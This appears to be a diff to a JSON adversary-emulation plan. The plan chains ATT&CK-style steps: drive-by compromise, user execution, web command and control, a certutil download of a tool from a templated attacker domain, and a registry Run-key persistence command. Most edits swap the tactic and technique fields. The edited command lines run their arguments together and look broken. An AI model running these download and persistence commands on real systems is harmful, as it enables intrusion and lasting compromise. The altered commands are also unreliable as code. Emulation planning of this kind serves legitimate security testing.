@@ -9,24 +9,24 @@
     },
     "procedures": [
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator",
             "preconditions": {
                 "tool": "self.tool_name"
             }
         },
         {
-            "tactic": "Actuator",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Actuator",
             "label": "actuator2",
             "preconditions": {
                 "tool": "self.tool_name2"
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces",
             "preconditions": {
                 "tool": "self.tool",
@@ -35,8 +35,8 @@
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS",
             "preconditions": {
                 "tool": "self.tool",
@@ -45,8 +45,8 @@
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX",
             "preconditions": {
                 "self.tool_name": "self.tool",
@@ -57,24 +57,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces3",
             "preconditions": {
                 "driveby": "self.driveby3"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS3",
             "preconditions": {
                 "driveby": "self.driveby3"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX3",
             "preconditions": {
                 "payload": "help_win_x86.exe",
@@ -83,24 +83,24 @@
             }
         },
         {
-            "tactic": "Interfaces",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "Interfaces",
             "label": "Interfaces4",
             "preconditions": {
                 "driveby": "self.driveby4"
             }
         },
         {
-            "tactic": "DNS",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "DNS",
             "label": "DNS4",
             "preconditions": {
                 "driveby": "self.driveby4"
             }
         },
         {
-            "tactic": "NGINX",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "NGINX",
             "label": "NGINX4",
             "preconditions": {
                 "payload": "dismcore.dll",
@@ -109,16 +109,16 @@
             }
         },
         {
-            "tactic": "PayloadCheapride",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadCheapride",
             "label": "Payload",
             "preconditions": {
                 "tool": "self.tool"
             }
         },
         {
-            "tactic": "PayloadPupy",
-            "technique": "Infrastructure",
+            "tactic": "Infrastructure",
+            "technique": "PayloadPupy",
             "label": "Payload2",
             "preconditions": {
                 "tool": "self.tool2",
@@ -126,8 +126,8 @@
             }
         },
         {
-            "tactic": "DriveByCompromise",
-            "technique": "InitialAccess",
+            "tactic": "InitialAccess",
+            "technique": "DriveByCompromise",
             "label": "driveByCompromise",
             "preconditions": {
                 "actuator": "self.actuator",
@@ -137,8 +137,8 @@
             }
         },
         {
-            "tactic": "UserExecution",
-            "technique": "Execution",
+            "tactic": "Execution",
+            "technique": "UserExecution",
             "label": "userExecution",
             "preconditions": {
                 "actuator_id": "self.actuator",
@@ -148,8 +148,8 @@
             }
         },
         {
-            "tactic": "WebProtocols",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "WebProtocols",
             "label": "webProtocols_1",
             "preconditions": {
                 "actuator_id": "self.actuator2",
@@ -163,34 +163,34 @@
             }
         },
         {
-            "tactic": "IngressToolTransfer",
-            "technique": "c2",
+            "tactic": "c2",
+            "technique": "IngressToolTransfer",
             "label": "ingressToolTransfer1",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain3}/${self.tool_name3} ${self.temp_dir_name}\\${self.tool_name3} && echo \"stderr: \u0001 Command not found\""
+                    "command": "cmd /c certutil.exe -urlcache -split -f http://${self.driveby_domain3}/${self.tool_name3}${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \u0001 Command not found\""
                 }
             }
         },
         {
-            "tactic": "RegistryRunKeysStartupFolder",
-            "technique": "Persistence",
+            "tactic": "Persistence",
+            "technique": "RegistryRunKeysStartupFolder",
             "label": "addRunRegistryKey",
             "preconditions": {
                 "agent": "self.agent_tgt1",
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d ${self.temp_dir_name}\\${self.tool_name3} && echo \"stderr: \\1 Command not found\""
+                    "command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v systemconfig /d${self.temp_dir_name}\\${self.tool_name3}&& echo \"stderr: \\1 Command not found\""
                 }
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1_elevated",
@@ -199,8 +199,8 @@
             }
         },
         {
-            "tactic": "AgentExit",
-            "technique": "Utility",
+            "tactic": "Utility",
+            "technique": "AgentExit",
             "label": "AgentExit",
             "preconditions": {
                 "agent": "self.agent_tgt1",
